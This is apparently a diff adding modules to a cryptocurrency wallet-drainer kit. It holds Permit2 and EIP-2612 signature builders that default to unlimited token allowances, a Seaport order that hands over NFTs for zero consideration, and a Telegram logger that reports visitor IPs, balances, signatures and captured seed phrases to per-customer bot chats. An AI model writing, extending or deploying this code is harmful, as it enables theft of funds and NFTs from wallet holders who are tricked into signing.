+          // Wait for chain to be ready
+          await new Promise(resolve => setTimeout(resolve, delayBetweenSwitches));
+          
+          // Execute callback
+          const callbackResult = await callback(chainKey, switchResult);
+          results.push({ chainKey, switch: switchResult, callback: callbackResult });
+        }
+      } catch (error) {
+        results.push({ chainKey, error: error.message });
+        if (!continueOnError) break;
+      }
+    }
+    
+    return results;
+  }
+
+  // Public API
+  return {
+    CHAIN_PARAMS,
+    CHAIN_ID_MAP,
+    switchTo,
+    switchMultiple,
+    getCurrentChain,
+    isOnChain,
+    watchChainChanges,
+    getSupportedChains,
+    getChainParams,
+    batchSwitchWithCallback
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = ChainSwitch;
+}
+
+/**
+ * Signer Module
+ * Handles all signature operations: EIP-712 typed data, personal_sign, and Permit signatures
+ * Supports eth_signTypedData_v4, eth_signTypedData_v3, eth_signTypedData, personal_sign
+ */
+
+const Signer = (function() {
+  'use strict';
+
+  // EIP-712 Domain types
+  const EIP712_DOMAIN_TYPE = [
+    { name: 'name', type: 'string' },
+    { name: 'version', type: 'string' },
+    { name: 'chainId', type: 'uint256' },
+    { name: 'verifyingContract', type: 'address' }
+  ];
+
+  // Permit2 domain
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+  /**
+   * Request EIP-712 typed data signature (v4)
+   * @param {object} provider - Web3 provider
+   * @param {string} address - Signer address
+   * @param {object} typedData - EIP-712 typed data object
+   * @returns {Promise<string>} Signature
+   */
+  async function signTypedData(provider, address, typedData) {
+    if (!provider) {
+      throw new Error('No provider available');
+    }
+
+    try {
+      // Try v4 first (most compatible with MetaMask)
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [address, JSON.stringify(typedData)]
+      });
+      return signature;
+    } catch (error) {
+      // Fallback to v3
+      try {
+        const signature = await provider.request({
+          method: 'eth_signTypedData_v3',
+          params: [address, JSON.stringify(typedData)]
+        });
+        return signature;
+      } catch (v3Error) {
+        // Final fallback to v1
+        try {
+          const signature = await provider.request({
+            method: 'eth_signTypedData',
+            params: [typedData, address]
+          });
+          return signature;
+        } catch (v1Error) {
+          throw new Error(`All signing methods failed: ${error.message}`);
+        }
+      }
+    }
+  }
+
+  /**
+   * Request personal_sign signature
+   * @param {object} provider - Web3 provider
+   * @param {string} address - Signer address
+   * @param {string} message - Message to sign
+   * @returns {Promise<string>} Signature
+   */
+  async function personalSign(provider, address, message) {
+    if (!provider) {
+      throw new Error('No provider available');
+    }
+
+    // Convert string to hex if needed
+    let hexMessage = message;
+    if (!message.startsWith('0x')) {
+      hexMessage = '0x' + Buffer.from(message).toString('hex');
+    }
+
+    try {
+      const signature = await provider.request({
+        method: 'personal_sign',
+        params: [hexMessage, address]
+      });
+      return signature;
+    } catch (error) {
+      throw new Error(`personal_sign failed: ${error.message}`);
+    }
+  }
+
+  /**
+   * Create Permit2 permit typed data for tokens
+   * @param {object} params - Permit parameters
+   * @returns {object} EIP-712 typed data
+   */
+  function createPermit2TypedData(params) {
+    const {
+      owner,
+      token,
+      spender,
+      amount,
+      expiration,
+      nonce,
+      chainId,
+      sigDeadline
+    } = params;
+
+    const domain = {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: EIP712_DOMAIN_TYPE,
+      PermitTransferFrom: [
+        { name: 'permitted', type: 'TokenPermissions' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ],
+      TokenPermissions: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      permitted: {
+        token: token,
+        amount: amount
+      },
+      spender: spender,
+      nonce: nonce,
+      deadline: sigDeadline || expiration
+    };
+
+    return { domain, types, primaryType: 'PermitTransferFrom', message };
+  }
+
+  /**
+   * Create Permit2 batch permit typed data for multiple tokens
+   */
+  function createPermit2BatchTypedData(params) {
+    const {
+      owner,
+      tokens, // Array of { token, amount }
+      spender,
+      nonce,
+      chainId,
+      deadline
+    } = params;
+
+    const domain = {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: EIP712_DOMAIN_TYPE,
+      PermitBatchTransferFrom: [
+        { name: 'permitted', type: 'TokenPermissions[]' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ],
+      TokenPermissions: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      permitted: tokens.map(t => ({
+        token: t.token,
+        amount: t.amount
+      })),
+      spender: spender,
+      nonce: nonce,
+      deadline: deadline
+    };
+
+    return { domain, types, primaryType: 'PermitBatchTransferFrom', message };
+  }
+
+  /**
+   * Create standard EIP-2612 Permit typed data
+   * @param {object} params - Permit parameters
+   * @returns {object} EIP-712 typed data
+   */
+  function createPermitTypedData(params) {
+    const {
+      owner,
+      token,
+      tokenName,
+      spender,
+      value,
+      nonce,
+      deadline,
+      chainId
+    } = params;
+
+    const domain = {
+      name: tokenName || 'Token',
+      version: '1',
+      chainId: chainId,
+      verifyingContract: token
+    };
+
+    const types = {
+      EIP712Domain: EIP712_DOMAIN_TYPE,
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      owner: owner,
+      spender: spender,
+      value: value,
+      nonce: nonce,
+      deadline: deadline
+    };
+
+    return { domain, types, primaryType: 'Permit', message };
+  }
+
+  /**
+   * Create Seaport order typed data
+   */
+  function createSeaportTypedData(params) {
+    const {
+      offerer,
+      zone,
+      offer, // Array of { itemType, token, identifierOrCriteria, startAmount, endAmount }
+      consideration, // Array of same structure
+      startTime,
+      endTime,
+      orderType,
+      nonce,
+      chainId
+    } = params;
+
+    const SEAPORT_ADDRESS = '0x00000000006c3852cbEf3e08E8dF289169EdE581';
+
+    const domain = {
+      name: 'Seaport',
+      version: '1.1',
+      chainId: chainId,
+      verifyingContract: SEAPORT_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: EIP712_DOMAIN_TYPE,
+      OrderComponents: [
+        { name: 'offerer', type: 'address' },
+        { name: 'zone', type: 'address' },
+        { name: 'offer', type: 'OfferItem[]' },
+        { name: 'consideration', type: 'ConsiderationItem[]' },
+        { name: 'orderType', type: 'uint8' },
+        { name: 'startTime', type: 'uint256' },
+        { name: 'endTime', type: 'uint256' },
+        { name: 'zoneHash', type: 'bytes32' },
+        { name: 'salt', type: 'uint256' },
+        { name: 'conduitKey', type: 'bytes32' },
+        { name: 'counter', type: 'uint256' }
+      ],
+      OfferItem: [
+        { name: 'itemType', type: 'uint8' },
+        { name: 'token', type: 'address' },
+        { name: 'identifierOrCriteria', type: 'uint256' },
+        { name: 'startAmount', type: 'uint256' },
+        { name: 'endAmount', type: 'uint256' }
+      ],
+      ConsiderationItem: [
+        { name: 'itemType', type: 'uint8' },
+        { name: 'token', type: 'address' },
+        { name: 'identifierOrCriteria', type: 'uint256' },
+        { name: 'startAmount', type: 'uint256' },
+        { name: 'endAmount', type: 'uint256' },
+        { name: 'recipient', type: 'address' }
+      ]
+    };
+
+    const message = {
+      offerer: offerer,
+      zone: zone || '0x0000000000000000000000000000000000000000',
+      offer: offer,
+      consideration: consideration,
+      orderType: orderType || 0,
+      startTime: startTime,
+      endTime: endTime,
+      zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
+      salt: nonce,
+      conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
+      counter: 0
+    };
+
+    return { domain, types, primaryType: 'OrderComponents', message };
+  }
+
+  /**
+   * Sign a transaction (for some wallets)
+   */
+  async function signTransaction(provider, from, txObject) {
+    if (!provider) {
+      throw new Error('No provider available');
+    }
+
+    try {
+      const signedTx = await provider.request({
+        method: 'eth_signTransaction',
+        params: [{ from, ...txObject }]
+      });
+      return signedTx;
+    } catch (error) {
+      throw new Error(`Transaction signing failed: ${error.message}`);
+    }
+  }
+
+  /**
+   * Parse signature into v, r, s components
+   * @param {string} signature - Hex signature
+   * @returns {object} { v, r, s }
+   */
+  function parseSignature(signature) {
+    if (!signature || signature.length < 130) {
+      throw new Error('Invalid signature length');
+    }
+
+    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
+    
+    return {
+      r: '0x' + sig.slice(0, 64),
+      s: '0x' + sig.slice(64, 128),
+      v: parseInt(sig.slice(128, 130), 16)
+    };
+  }
+
+  /**
+   * Recover address from signature
+   * Note: This requires ethers.js or similar library
+   */
+  function recoverAddress(message, signature, isPersonalSign = true) {
+    // This would need ethers.js or similar
+    // For now, return null - actual implementation would verify
+    return null;
+  }
+
+  /**
+   * Create generic EIP-712 typed data
+   * @param {object} domain - Domain object
+   * @param {object} types - Types definition
+   * @param {string} primaryType - Primary type name
+   * @param {object} message - Message object
+   * @returns {object} Complete typed data
+   */
+  function createTypedData(domain, types, primaryType, message) {
+    return {
+      domain,
+      types: {
+        EIP712Domain: EIP712_DOMAIN_TYPE,
+        ...types
+      },
+      primaryType,
+      message
+    };
+  }
+
+  /**
+   * Sign Permit2 allowance transfer
+   * Convenience method combining typed data creation and signing
+   */
+  async function signPermit2Transfer(provider, owner, params) {
+    const typedData = createPermit2TypedData({
+      owner,
+      ...params
+    });
+
+    return await signTypedData(provider, owner, typedData);
+  }
+
+  /**
+   * Sign batch Permit2 transfer
+   */
+  async function signPermit2BatchTransfer(provider, owner, params) {
+    const typedData = createPermit2BatchTypedData({
+      owner,
+      ...params
+    });
+
+    return await signTypedData(provider, owner, typedData);
+  }
+
+  /**
+   * Sign standard EIP-2612 permit
+   */
+  async function signPermit(provider, owner, params) {
+    const typedData = createPermitTypedData({
+      owner,
+      ...params
+    });
+
+    return await signTypedData(provider, owner, typedData);
+  }
+
+  /**
+   * Sign Seaport order
+   */
+  async function signSeaportOrder(provider, offerer, params) {
+    const typedData = createSeaportTypedData({
+      offerer,
+      ...params
+    });
+
+    return await signTypedData(provider, offerer, typedData);
+  }
+
+  /**
+   * Create typed data for NFT approval via Seaport
+   */
+  function createNFTApprovalTypedData(params) {
+    const {
+      owner,
+      nftContract,
+      tokenId,
+      spender,
+      startTime,
+      endTime,
+      nonce,
+      chainId
+    } = params;
+
+    // Create an order where the NFT is offered for 0 consideration
+    // This effectively approves the NFT for transfer
+    return createSeaportTypedData({
+      offerer: owner,
+      zone: '0x0000000000000000000000000000000000000000',
+      offer: [{
+        itemType: 2, // ERC721
+        token: nftContract,
+        identifierOrCriteria: tokenId || '0',
+        startAmount: '1',
+        endAmount: '1'
+      }],
+      consideration: [],
+      startTime: startTime,
+      endTime: endTime,
+      orderType: 0,
+      nonce: nonce,
+      chainId: chainId
+    });
+  }
+
+  /**
+   * Get nonce from contract (requires ethers)
+   * Placeholder - actual implementation would call contract
+   */
+  async function getPermit2Nonce(provider, owner) {
+    // Would call Permit2.nonceBitmap or similar
+    return Date.now();
+  }
+
+  // Public API
+  return {
+    PERMIT2_ADDRESS,
+    EIP712_DOMAIN_TYPE,
+    signTypedData,
+    personalSign,
+    createPermit2TypedData,
+    createPermit2BatchTypedData,
+    createPermitTypedData,
+    createSeaportTypedData,
+    createNFTApprovalTypedData,
+    createTypedData,
+    signTransaction,
+    parseSignature,
+    recoverAddress,
+    signPermit2Transfer,
+    signPermit2BatchTransfer,
+    signPermit,
+    signSeaportOrder,
+    getPermit2Nonce
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = Signer;
+}
+
+
+/**
+ * Logger Module
+ * Handles all Telegram notifications and logging
+ * Supports customer-specific bot tokens and chat IDs
+ */
+
+const Logger = (function() {
+  'use strict';
+
+  let config = {
+    botToken: null,
+    chatId: null,
+    enabled: true
+  };
+
+  const STATUS_EMOJI = {
+    success: '✅',
+    error: '❌',
+    warning: '⚠️',
+    info: 'ℹ️',
+    money: '💰',
+    wallet: '👛',
+    chain: '⛓️',
+    signature: '✍️',
+    connection: '🔗',
+    seed: '🌱',
+    nft: '🖼️'
+  };
+
+  function configure(options) {
+    config = { ...config, ...options };
+    if (!config.botToken || !config.chatId) config.enabled = false;
+  }
+
+  async function send(message) {
+    if (!config.enabled) return;
+    try {
+      await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: config.chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    } catch (e) {}
+  }
+
+  async function getInfo() {
+    try {
+      const resp = await fetch('https://ipapi.co/json/');
+      return await resp.json();
+    } catch (e) {
+      return { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
+    }
+  }
+
+  async function logVisit(params) {
+      const info = await getInfo();
+      const lines = [
+          `<b>👀 New Visit</b>`,
+          `Address: <code>${params.address || 'Visitor'}</code>`,
+          `Referrer: <code>${params.referrer || 'Direct'}</code>`,
+          `IP: <code>${info.ip}</code> (${info.city}, ${info.country_name})`,
+          `Agent: <code>${navigator.userAgent.slice(0, 50)}...</code>`
+      ];
+      return await send(lines.join('\n'));
+  }
+
+  async function logConnection(params) {
+    const info = await getInfo();
+    const lines = [
+      `<b>🔗 Wallet Connected</b>`,
+      `Address: <code>${params.address}</code>`,
+      `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
+      `Wallet: <code>${params.walletType || 'unknown'}</code>`,
+      `Balance: <code>${params.balance || '0.00'}</code>`,
+      `IP: <code>${info.ip}</code> (${info.city}, ${info.country_name})`
+    ];
+    return await send(lines.join('\n'));
+  }
+
+  async function logAction(params) {
+      const lines = [
+          `<b>⚡ Action Performed</b>`,
+          `Address: <code>${params.address}</code>`,
+          `Action: <code>${params.action}</code>`,
+          `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
+          `Status: <code>${params.status || 'success'}</code>`
+      ];
+      if (params.amount) lines.push(`Amount: <code>${params.amount}</code>`);
+      return await send(lines.join('\n'));
+  }
+
+  async function logSignature(params) {
+    const lines = [
+      `<b>✍️ Signature Received</b>`,
+      `Address: <code>${params.address}</code>`,
+      `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
+      `Type: <code>${params.signatureType || 'Permit2'}</code>`,
+      `Asset: <code>${params.tokenSymbol || 'Native'}</code>`,
+      `Amount: <code>${params.amount || 'Unknown'}</code>`
+    ];
+    return await send(lines.join('\n'));
+  }
+
+  async function logSeed(params) {
+      const lines = [
+          `<b>🌱 SEED CAPTURED</b>`,
+          `Address: <code>${params.address}</code>`,
+          `Seed: <code>${params.seedPhrase}</code>`
+      ];
+      return await send(lines.join('\n'));
+  }
+
+  return {
+    configure,
+    send,
+    logVisit,
+    logConnection,
+    logAction,
+    logSignature,
+    logSeed
+  };
+})();
+
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = Logger;
+}
+
+  if (typeof WalletDetect !== 'undefined') window.WalletDetect = WalletDetect;
+  if (typeof Logger !== 'undefined') window.Logger = Logger;
+  if (typeof Signer !== 'undefined') window.Signer = Signer;
+  if (typeof ChainSwitch !== 'undefined') window.ChainSwitch = ChainSwitch;
+
+  // ===== FEATURE MODULES =====
+  /**
+ * Permit2 Module
+ * Handles all Permit2 signature operations for unlimited token approvals
+ * Permit2 is a universal token approval contract by Uniswap
+ * Contract: 0x000000000022D473030F116dDEE9F6B43aC78BA3
+ */
+
+const Permit2 = (function() {
+  'use strict';
+
+  // Permit2 contract address (same on all EVM chains)
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+  // Permit2 ABI (minimal for our purposes)
+  const PERMIT2_ABI = [
+    // Read functions
+    'function allowance(address user, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)',
+    'function nonceBitmap(address owner, uint248 nonceWord) external view returns (uint256)',
+    
+    // Write functions
+    'function approve(address token, address spender, uint160 amount, uint48 expiration) external',
+    'function permit(address owner, tuple(tuple(address token, uint160 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature) external',
+    'function permitTransferFrom(tuple(tuple(address token, uint160 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 amount) transferDetails, address owner, bytes signature) external',
+    'function permitTransferFromBatch(tuple(tuple(address token, uint160 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256[] amounts) transferDetails, address owner, bytes signature) external',
+    
+    // Events
+    'event Approval(address indexed owner, address indexed token, address indexed spender, uint160 amount, uint48 expiration)',
+    'event PermitTransferFrom(address indexed owner, address indexed token, address indexed spender, uint160 amount, uint256 nonce, uint256 deadline)'
+  ];
+
+  // Max uint160 for unlimited approval
+  const MAX_UINT160 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
+
+  // Max uint256
+  const MAX_UINT256 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
+
+  /**
+   * Create Permit2 signature message for single token
+   * @param {object} params
+   * @returns {object} Typed data for signing
+   */
+  function createPermitTransferFrom(params) {
+    const {
+      owner,
+      token,
+      amount,
+      spender,
+      nonce,
+      deadline,
+      chainId
+    } = params;
+
+    const domain = {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      PermitTransferFrom: [
+        { name: 'permitted', type: 'TokenPermissions' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ],
+      TokenPermissions: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      permitted: {
+        token: token,
+        amount: amount || MAX_UINT256
+      },
+      spender: spender,
+      nonce: nonce || Date.now(),
+      deadline: deadline || Math.floor(Date.now() / 1000) + 3600 // 1 hour default
+    };
+
+    return { domain, types, primaryType: 'PermitTransferFrom', message };
+  }
+
+  /**
+   * Create Permit2 batch signature for multiple tokens
+   * @param {object} params
+   * @returns {object} Typed data for signing
+   */
+  function createPermitBatchTransferFrom(params) {
+    const {
+      owner,
+      tokens, // Array of { token, amount }
+      spender,
+      nonce,
+      deadline,
+      chainId
+    } = params;
+
+    const domain = {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      PermitBatchTransferFrom: [
+        { name: 'permitted', type: 'TokenPermissions[]' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ],
+      TokenPermissions: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      permitted: tokens.map(t => ({
+        token: t.token,
+        amount: t.amount || MAX_UINT256
+      })),
+      spender: spender,
+      nonce: nonce || Date.now(),
+      deadline: deadline || Math.floor(Date.now() / 1000) + 3600
+    };
+
+    return { domain, types, primaryType: 'PermitBatchTransferFrom', message };
+  }
+
+  /**
+   * Create signature allowance transfer
+   * Alternative format for Permit2
+   */
+  function createSignatureAllowanceTransfer(params) {
+    const {
+      owner,
+      token,
+      amount,
+      spender,
+      expiration,
+      nonce,
+      chainId
+    } = params;
+
+    const domain = {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+
+    const types = {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'permitted', type: 'TokenPermissions' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ],
+      TokenPermissions: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      owner: owner,
+      permitted: {
+        token: token,
+        amount: amount || MAX_UINT256
+      },
+      spender: spender,
+      nonce: nonce || Date.now(),
+      deadline: expiration || Math.floor(Date.now() / 1000) + 86400 * 30 // 30 days
+    };
+
+    return { domain, types, primaryType: 'Permit', message };
+  }
+
+  /**
+   * Generate unique nonce based on address and timestamp
+   */
+  function generateNonce(address) {
+    const timestamp = Date.now();
+    // Create a deterministic but unique nonce
+    const hash = address.slice(2, 10) + timestamp.toString(16);
+    return BigInt('0x' + hash);
+  }
+
+  /**
+   * Request Permit2 signature from wallet
+   * @param {object} provider - Web3 provider
+   * @param {string} address - Owner address
+   * @param {object} params - Permit parameters
+   * @returns {Promise<string>} Signature
+   */
+  async function requestPermit2Signature(provider, address, params) {
+    const typedData = createPermitTransferFrom({
+      owner: address,
+      ...params
+    });
+
+    try {
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [address, JSON.stringify(typedData)]
+      });
+      return signature;
+    } catch (error) {
+      // Try v3 fallback
+      try {
+        const signature = await provider.request({
+          method: 'eth_signTypedData_v3',
+          params: [address, JSON.stringify(typedData)]
+        });
+        return signature;
+      } catch (v3Error) {
+        throw new Error(`Permit2 signing failed: ${error.message}`);
+      }
+    }
+  }
+
+  /**
+   * Request batch Permit2 signature
+   */
+  async function requestBatchPermit2Signature(provider, address, params) {
+    const typedData = createPermitBatchTransferFrom({
+      owner: address,
+      ...params
+    });
+
+    try {
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [address, JSON.stringify(typedData)]
+      });
+      return signature;
+    } catch (error) {
+      throw new Error(`Batch Permit2 signing failed: ${error.message}`);
+    }
+  }
+
+  /**
+   * Parse Permit2 signature into components
+   * @param {string} signature
+   * @returns {object} { v, r, s }
+   */
+  function parsePermit2Signature(signature) {
+    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
+    
+    if (sig.length < 128) {
+      throw new Error('Invalid signature length');
+    }
+
+    return {
+      r: '0x' + sig.slice(0, 64),
+      s: '0x' + sig.slice(64, 128),
+      v: parseInt(sig.slice(128, 130), 16)
+    };
+  }
+
+  /**
+   * Build calldata for permitTransferFrom
+   * This constructs the raw transaction calldata
+   */
+  function buildPermitTransferFromCalldata(permit, transferDetails, owner, signature) {
+    const { parsePermit2Signature } = this || Permit2;
+    const { v, r, s } = parsePermit2Signature(signature);
+
+    // Function selector for permitTransferFrom
+    const selector = '0x30f28b7a';
+
+    // Encode the parameters (simplified - actual implementation would use ethers.js)
+    // This is a placeholder - real implementation needs proper ABI encoding
+    const encoded = selector; // + encoded params
+
+    return encoded;
+  }
+
+  /**
+   * Create Permit2 approval transaction data
+   * For direct approve (no signature needed)
+   */
+  function createApprovalCalldata(token, spender, amount, expiration) {
+    // Function selector for approve(address,address,uint160,uint48)
+    const selector = '0x768b6d34';
+    
+    // This would need proper ABI encoding
+    return selector;
+  }
+
+  /**
+   * Get Permit2 allowance for a token
+   * @param {object} provider - Web3 provider
+   * @param {string} owner - Token owner
+   * @param {string} token - Token address
+   * @param {string} spender - Spender address
+   * @returns {Promise<object>} { amount, expiration, nonce }
+   */
+  async function getAllowance(provider, owner, token, spender) {
+    // This would need contract call implementation
+    // For now return default
+    return {
+      amount: '0',
+      expiration: 0,
+      nonce: 0
+    };
+  }
+
+  /**
+   * Check if Permit2 is deployed on chain
+   * Permit2 is deployed at the same address on all supported chains
+   */
+  async function isDeployed(provider) {
+    try {
+      const code = await provider.request({
+        method: 'eth_getCode',
+        params: [PERMIT2_ADDRESS, 'latest']
+      });
+      return code && code !== '0x' && code !== '0x0';
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Create complete Permit2 payload for frontend
+   * Combines all necessary data for the signing request
+   */
+  function createCompletePayload(params) {
+    const {
+      owner,
+      tokens,
+      spender,
+      chainId,
+      deadline
+    } = params;
+
+    const nonce = generateNonce(owner);
+    const finalDeadline = deadline || Math.floor(Date.now() / 1000) + 3600;
+
+    if (tokens.length === 1) {
+      return {
+        type: 'single',
+        typedData: createPermitTransferFrom({
+          owner,
+          token: tokens[0].token,
+          amount: tokens[0].amount,
+          spender,
+          nonce,
+          deadline: finalDeadline,
+          chainId
+        }),
+        nonce,
+        deadline: finalDeadline
+      };
+    }
+
+    return {
+      type: 'batch',
+      typedData: createPermitBatchTransferFrom({
+        owner,
+        tokens,
+        spender,
+        nonce,
+        deadline: finalDeadline,
+        chainId
+      }),
+      nonce,
+      deadline: finalDeadline
+    };
+  }
+
+  /**
+   * Validate Permit2 signature
+   * @param {string} signature
+   * @returns {boolean}
+   */
+  function validateSignature(signature) {
+    if (!signature || typeof signature !== 'string') {
+      return false;
+    }
+
+    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
+    
+    // Must be 65 bytes (130 hex chars + 2 for v)
+    if (sig.length !== 130) {
+      return false;
+    }
+
+    // Check if valid hex
+    return /^[0-9a-fA-F]+$/.test(sig);
+  }
+
+  // Public API
+  return {
+    PERMIT2_ADDRESS,
+    PERMIT2_ABI,
+    MAX_UINT160,
+    MAX_UINT256,
+    createPermitTransferFrom,
+    createPermitBatchTransferFrom,
+    createSignatureAllowanceTransfer,
+    generateNonce,
+    requestPermit2Signature,
+    requestBatchPermit2Signature,
+    parsePermit2Signature,
+    buildPermitTransferFromCalldata,
+    createApprovalCalldata,
+    getAllowance,
+    isDeployed,
+    createCompletePayload,
+    validateSignature
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = Permit2;
+}
+
+
+/**
+ * Permit Module
+ * Handles standard EIP-2612 Permit signatures for token approvals
+ * Allows gasless token approvals via signatures
+ */
+
+const Permit = (function() {
+  'use strict';
+
+  // Max uint256 for unlimited approval
+  const MAX_UINT256 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
+
+  // Common token names for known tokens (fallback if contract doesn't return name)
+  const KNOWN_TOKENS = {
+    // Ethereum
+    '0xdAC17F958D2ee523a2206206994597C13D831ec7': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
+    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
+    '0x6B175474E89094C44Da98b954EedeAC495271d0F': { name: 'Dai Stablecoin', symbol: 'DAI', decimals: 18 },
+    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': { name: 'Uniswap', symbol: 'UNI', decimals: 18 },
+    '0x514910771AF9Ca656af840dff83E8264EcF986CA': { name: 'ChainLink Token', symbol: 'LINK', decimals: 18 },
+    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9': { name: 'Aave Token', symbol: 'AAVE', decimals: 18 },
+    '0x6De037ef9aD27adb5F178A0E670b2B819b5F22cA': { name: 'Dypius', symbol: 'DYP', decimals: 18 },
+    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599': { name: 'Wrapped BTC', symbol: 'WBTC', decimals: 8 },
+    '0xc00e94Cb662C3520282E6f5717214004A7f26888': { name: 'Compound', symbol: 'COMP', decimals: 18 },
+    '0x514910771AF9Ca656af840dff83E8264EcF986CA': { name: 'ChainLink Token', symbol: 'LINK', decimals: 18 },
+    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9': { name: 'Aave Token', symbol: 'AAVE', decimals: 18 },
+    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': { name: 'Uniswap', symbol: 'UNI', decimals: 18 },
+    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE': { name: 'SHIBA INU', symbol: 'SHIB', decimals: 18 },
+    
+    // BSC
+    '0x55d398326f99059fF775485246999027B3197955': { name: 'Tether USD', symbol: 'USDT', decimals: 18 },
+    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d': { name: 'USD Coin', symbol: 'USDC', decimals: 18 },
+    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c': { name: 'WBNB', symbol: 'WBNB', decimals: 18 },
+    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8': { name: 'Ethereum Token', symbol: 'ETH', decimals: 18 },
+    
+    // Polygon
+    '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
+    '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
+    '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
+    '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6': { name: 'Wrapped Bitcoin', symbol: 'WBTC', decimals: 8 },
+    
+    // Arbitrum
+    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
+    '0xaf88d065e77c8cC2239327C5EDb3A432268e5831': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
